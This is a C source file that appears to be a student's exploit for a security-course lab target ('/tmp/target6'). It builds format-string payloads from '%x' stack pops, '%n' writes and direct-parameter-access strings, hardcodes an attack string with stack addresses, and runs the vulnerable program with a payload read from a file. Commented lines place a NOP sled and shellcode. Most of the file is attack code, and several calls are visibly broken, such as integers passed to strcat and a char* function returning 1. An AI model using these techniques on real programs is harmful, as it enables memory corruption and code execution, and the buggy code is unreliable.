#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define TARGET "/tmp/target6"

char* readFileIn(char* name) {
    int fd;
    struct stat st;
    char *string;
    
    /* Open the file */
    fd = open(name, O_RDONLY);
    if (fd < 0) {  /* Check if succesfully opened. */
        perror("Error opening file");
        return 1;
    }

    /* Get its size in bytes */
    if (fstat(fd, &st) < 0) {   /* Check if succesful. */
        perror("Error getting file size");
        return 1;
    }

    /* Get that much memory for the string.
     * But get 1 byte more, to store the '\0' to terminate the string.
     */
    string = malloc(st.st_size + 1);   /* 1 byte more */
    if (string == NULL) {  /* Check we really got it. */
        fprintf(stderr, "Error: out of memory.\n");
        return 1;
    }

    /* Read the entire file into the string. No more, no less. */
    if (read(fd, string, st.st_size) < 0) { /* Check for error */
        perror("Error reading the file");
        return 1;
    }

    /* Make sure the string is terminated. */
    string[st.st_size] = '\0';

    /*** Once here, the entire file is read into 'string' without errors. ***/

    /* Now just output the string. */
    puts(string);
    return string;
}
void builddirectaccessstring(char* retChars, char* foo) {

strcat(retChars,
"%1$16u%2$n"
"%1$16u%3$n"
"%1$16u%4$n"
"%1$16u%5$n");
strcat(retChars,1);
strcat(retChars, (int *) &foo[0]);
strcat(retChars, (int *) &foo[1]);
strcat(retChars, (int *) &foo[2]);
strcat(retChars, (int *) &foo[3]);

}

char* buildStackPop(int numPops)
{
char* stackPopChars = malloc(numPops *20);
int i;
i = 0;
// Sub 1
for(;i<numPops-1;i++) {
strcat(stackPopChars,"%x.");

}
strcat(stackPopChars,"%n");
printf("Stackpop is: %s\n",stackPopChars);
return stackPopChars;
}
char* buildattackstring(char* retChars, char* addr, int stackpopNum) {
strcat(retChars,addr);
strcat(retChars,buildStackPop(stackpopNum));
//printf("strlen addr returns: %d\n",strlen(addr));
//strcat(retChars+strlen(addr),stackpop);
//printf("strlen stackpop returns: %d\n",strlen(stackpop));
return retChars;

}


int main(int argc, char* argv[])
{
  char *args[3];
  char *env[1];
  int i;

  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
  env[0] = NULL;

char *attackString = "\xdc\xfd\xff\xbfjunk\xdd\xfd\xff\xbfjunk\xde\xfd\xff\xbfjunk\xdf\xfd\xff\xbf%x.%x.%x.%x.%x.%x.%x.%x.%x.%n";
char *s = readFileIn("sploit6out");
printf("Read in file\n");
printf("Content is: %s\n",s);
printf("Strlen is: %d\n",strlen(s));
//char *addr = "\x6c\xfd\xff\xbf";
args[1] = s;  
//char *attackString = malloc(258);
//printf("Building string\n");
//char addr2[5] = "AAAA";
//printf("addr2 is %s\n",addr2);
//printf("Char pointer as d: %d, as x: %x\n",addr2,addr2);
//builddirectaccessstring(attackString, addr);
//printf("DA string built\n");
//printf("addr2 is %s\n",addr2);
//int bufSize = 258; // strlen(attackString)+1;
//  args[1] = malloc(bufSize);
//  memset(args[1],0x90,bufSize-1);
//  memcpy(args[1],attackString,strlen(attackString));
//  memcpy(args[1]+bufSize-strlen(shellcode),shellcode,strlen(shellcode));
//  args[1][bufSize - 1] = '\0';
  // args[1] = "%s%s%s%s%s%s%s%s%s%s%s";
  printf("Calling target\n");
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");
  return 0;
}
